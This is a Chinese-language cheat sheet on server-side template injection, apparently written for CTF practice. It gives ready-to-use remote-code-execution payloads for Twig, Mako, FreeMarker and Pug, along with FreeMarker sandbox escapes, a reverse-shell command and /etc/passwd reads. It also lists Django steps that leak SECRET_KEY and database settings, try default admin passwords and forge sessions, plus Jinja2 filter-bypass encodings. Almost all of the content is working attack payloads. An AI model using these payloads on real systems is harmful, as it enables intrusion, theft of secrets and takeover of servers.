# 其他模板引擎利用 + 过滤绕过

## Twig 利用 (PHP)

Twig 版本决定利用方式：
```
# Twig 1.x（老版本，直接 RCE）
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Twig 2.x/3.x（沙箱更严）
{{['id']|filter('system')}}
{{['cat /flag.txt']|filter('system')}}
```

## Mako (Python)
```
${__import__('os').popen('cat /flag.txt').read()}
```

## FreeMarker (Java) — 完整利用链

FreeMarker 是 Java 最常见的模板引擎（Spring Boot/MVC 常用）。利用核心是 `?new()` 内建函数。

### 检测

```
${7*7}        → 返回 49 → 可能是 FreeMarker 或 EL
<#assign x=7*7>${x}  → 返回 49 → 确认 FreeMarker
${.version}   → 返回 FreeMarker 版本号
```

### RCE 方式 1: Execute 类（最直接）

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}
```

单行写法：
```
${"freemarker.template.utility.Execute"?new()("cat /flag.txt")}
```

### RCE 方式 2: ObjectConstructor + ProcessBuilder

```
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign pb=oc("java.lang.ProcessBuilder", ["cat","/flag.txt"])>
<#assign proc=pb.start()>
<#assign is=proc.getInputStream()>
<#assign isr=oc("java.io.InputStreamReader", is)>
<#assign br=oc("java.io.BufferedReader", isr)>
${br.readLine()}
```

读取多行输出：
```
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign rt=oc("java.lang.Runtime")>
<#assign proc=rt.getRuntime().exec(["sh","-c","cat /flag.txt"])>
<#assign is=proc.getInputStream()>
<#assign sc=oc("java.util.Scanner", is)>
${sc.useDelimiter("\\A").next()}
```

### RCE 方式 3: JythonRuntime（如果 Jython 在 classpath）

```
<#assign jr="freemarker.template.utility.JythonRuntime"?new()>
<@jr>import os; os.system("cat /flag.txt")</@jr>
```

### 方式 4: 文件读取（无需 RCE）

```
<#assign file=object?api.class.forName("java.io.File").getConstructor(object?api.class.forName("java.lang.String")).newInstance("/etc/passwd")>
<#assign sc=object?api.class.forName("java.util.Scanner").getConstructor(object?api.class.forName("java.io.File")).newInstance(file)>
${sc.useDelimiter("\\A").next()}
```

### 绕过沙箱/限制

如果 `?new()` 被禁：
```
# 利用 ?api 内建函数（需要 api_builtin_enabled=true）
${"".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"cat /flag.txt")}

# 利用 ObjectWrapper
<#assign classLoader=object?api.class.getClassLoader()>
```

如果 `<#assign>` 被过滤：
```
# 使用 ${} 内联表达式（不需要 assign）
${"freemarker.template.utility.Execute"?new()("id")}
```

### FreeMarker 速查表

| 目标 | Payload |
|------|---------|
| 版本探测 | `${.version}` |
| RCE (简洁) | `${"freemarker.template.utility.Execute"?new()("id")}` |
| RCE (assign) | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| 读文件 | 通过 ProcessBuilder 执行 cat |
| 反弹 shell | `${ex("bash -c {echo,BASE64}|{base64,-d}|bash")}` |

## Pug (Node.js)
```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync('cat /flag.txt').toString();return sh}()}
```

## Django
Django 模板功能受限（不支持方法调用），但：
```
{{flag}}                    <- 上下文变量直接访问
{{settings.SECRET_KEY}}     <- 设置信息
{{settings.DATABASES}}      <- 数据库配置
{{debug}}                   <- 调试信息
```
Django 不支持 RCE，如果 flag 不在上下文中，需要换其他攻击面。

### Django 深度利用（无 RCE 但可泄露大量信息）

**Step 1: 上下文变量穷举**（最高优先级）
```
{{flag}}  {{FLAG}}  {{secret}}  {{key}}  {{password}}
{{user}}  {{admin}}  {{token}}  {{session}}
```

**Step 2: request 对象信息泄露**
```
{{request.META}}                     <- 所有环境变量（含 SECRET_KEY、数据库密码等）
{{request.META.SECRET_KEY}}          <- 直接读 SECRET_KEY
{{request.user}}                     <- 当前用户
{{request.session.items}}            <- Session 内容
{{request.resolver_match}}           <- URL 路由信息
{{request.COOKIES}}                  <- 所有 Cookie
```

**Step 3: settings 对象**
```
{{settings.DEBUG}}                   <- 是否开启调试
{{settings.SECRET_KEY}}              <- 签名密钥
{{settings.DATABASES}}               <- 数据库连接信息
{{settings.INSTALLED_APPS}}          <- 已安装应用列表
{{settings.ROOT_URLCONF}}            <- URL 配置模块路径
{{settings.TEMPLATES}}               <- 模板配置
```

**Step 4: DEBUG=True 时的 404 页面**
- 访问不存在的 URL → Django 调试页面显示所有 URL 路由
- 可以发现 `/admin/`、`/api/` 等隐藏路径

**Step 5: 如果 flag 不在模板变量中**
- 发现 `/admin/` → 尝试默认凭据 admin:admin, admin:password
- 用 `{{settings.SECRET_KEY}}` 伪造 session → 提权为 admin
- 用 `{{settings.DATABASES}}` 获取数据库信息 → 尝试直接读数据库
- 发现其他端点/API → 可能有更严重的漏洞（SQLi、文件读取等）

---

# 过滤绕过大全

## 下划线 `_` 被过滤
```
{{config|attr('\x5f\x5fclass\x5f\x5f')}}
{{config|attr('\u005f\u005fclass\u005f\u005f')}}
{{lipsum|attr(request.args.a)}}&a=__globals__
```

## 点号 `.` 被过滤
```
{{config['__class__']['__init__']['__globals__']}}
{{config|attr('__class__')|attr('__init__')|attr('__globals__')}}
```

## 括号 `()` 被过滤
```
使用 Jinja2 filter 链代替方法调用
```

## 引号 `' "` 被过滤
```
{{config|attr(request.args.a)}}&a=__class__
{{config|attr(request.cookies.a)}}  (Cookie: a=__class__)
```

## 关键字 (config/class/import) 被过滤
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

## 数字被过滤
```
使用 |length filter: ''|length 返回 0, 'a'|length 返回 1
```
